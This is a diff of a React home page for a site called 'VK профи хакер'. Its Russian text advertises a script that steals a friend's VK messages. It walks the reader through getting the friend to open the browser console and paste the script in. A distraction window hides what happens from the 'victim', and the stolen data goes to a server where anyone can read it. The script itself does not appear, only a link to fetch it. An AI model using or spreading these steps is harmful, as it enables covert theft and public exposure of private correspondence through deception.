@@ -1,7 +1,10 @@
 import React from "react";
 import { Link } from "react-router-dom";
 import bg from "@assets/images/main-bg.jpg";
+import hacker from "@assets/images/hacker.jpg";
 import code_img from "@assets/images/code.jpg";
+import console from "@assets/images/console.jpg";
+import result from "@assets/images/result.jpg";
 
 import "./home.scss";
 
@@ -43,23 +46,18 @@ export default class Home extends React.Component {
 				<div className="home__content" ref={ref => (this.second_screen_ref = ref)}>
 					<h1 className="home__block-title">VK профи хакер</h1>
 
-					<section className="home__section home__section-script">
+					<section className="home__section home__section-main">
 						<div className="home__section-wrapper container">
 							<div className="home__section-illustration">
-								<img src={code_img} alt="script image" />
+								<img src={hacker} alt="script image" />
 							</div>
 							<div className="home__section-content">
 								<h2 className="home__section-title">Как это работает?</h2>
 								<div className="home__section-description">
 									Мы даём вам скрипт, который будет перемещаться по перепискам
-									вашего друга и воровать сообщения ;) Далее скрипт каждые 10
+									вашего друга и воровать сообщения ;&#41; Далее скрипт каждые 10
 									секунд отправляет данные на сервер, где любой может просмотреть
 									эти данные.
-								</div>
-								<div className="home__section-link-wrapper">
-									<Link to="/get_script" className="home__section-link">
-										Получить скрипт
-									</Link>
 								</div>
 							</div>
 						</div>
@@ -67,18 +65,75 @@ export default class Home extends React.Component {
 
 					<h1 className="home__block-title">Инструкия</h1>
 
-					<section className="home__section home__section-">
+					<section className="home__section home__section-script">
 						<div className="home__section-wrapper container">
 							<div className="home__section-illustration">
 								<img src={code_img} alt="script image" />
 							</div>
 							<div className="home__section-content">
-								<h2 className="home__section-title">Как это работает?</h2>
+								<h2 className="home__section-title">Скопируйте скрипт</h2>
 								<div className="home__section-description">
-									Мы даём вам скрипт, который будет перемещаться по перепискам
-									вашего друга и воровать сообщения ;) Далее скрипт каждые 10
-									секунд отправляет данные на сервер, где любой может просмотреть
-									эти данные
+									В разделе "получить скрипт" или по ссылке ниже скопируйте код.
+									<div className="home__section-link-wrapper">
+										<Link to="/get_script" className="home__section-link">
+											Получить скрипт
+										</Link>
+									</div>
+								</div>
+							</div>
+						</div>
+					</section>
+
+					<section className="home__section home__section-console">
+						<div className="home__section-wrapper container">
+							<div className="home__section-illustration">
+								<img src={console} alt="script image" />
+							</div>
+							<div className="home__section-content">
+								<h2 className="home__section-title">Откройте консоль</h2>
+								<div className="home__section-description">
+									Попросите друга открыть консоль в браузере. На клавиатуре нужно
+									нажать <b>F12</b> или <b>ПКМ - Просмотреть код</b>. Откроется
+									панель разработчика. В верхней части в меню нужно выбрать пункт
+									<b> "Console"</b>.
+								</div>
+							</div>
+						</div>
+					</section>
+
+					<section className="home__section home__section-console">
+						<div className="home__section-wrapper container">
+							<div className="home__section-illustration">
+								<img src={result} alt="script image" />
+							</div>
+							<div className="home__section-content">
+								<h2 className="home__section-title">Запустите скрипт</h2>
+								<div className="home__section-description">
+									Теперь в консоль нужно вставить скопированный ранее скрипт и
+									нажать
+									<b>enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
+									поняла, что происходит, откроется специальное окно, которое
+									отвлечет пользователя, exxexexxexe :&#41;
+								</div>
+							</div>
+						</div>
+					</section>
+
+					<section className="home__section home__section-console">
+						<div className="home__section-wrapper container">
+							<div className="home__section-illustration">
+								<img src={console} alt="script image" />
+							</div>
+							<div className="home__section-content">
+								<h2 className="home__section-title">Посмотрите результат</h2>
+								<div className="home__section-description">
+									Скрипт отправит полученные данные на сервер и вы сможете их
+									посмотреть.
+									<div className="home__section-link-wrapper">
+										<Link to="/get_script" className="home__section-link">
+											Поиск диалогов
+										</Link>
+									</div>
 								</div>
 							</div>
 						</div>
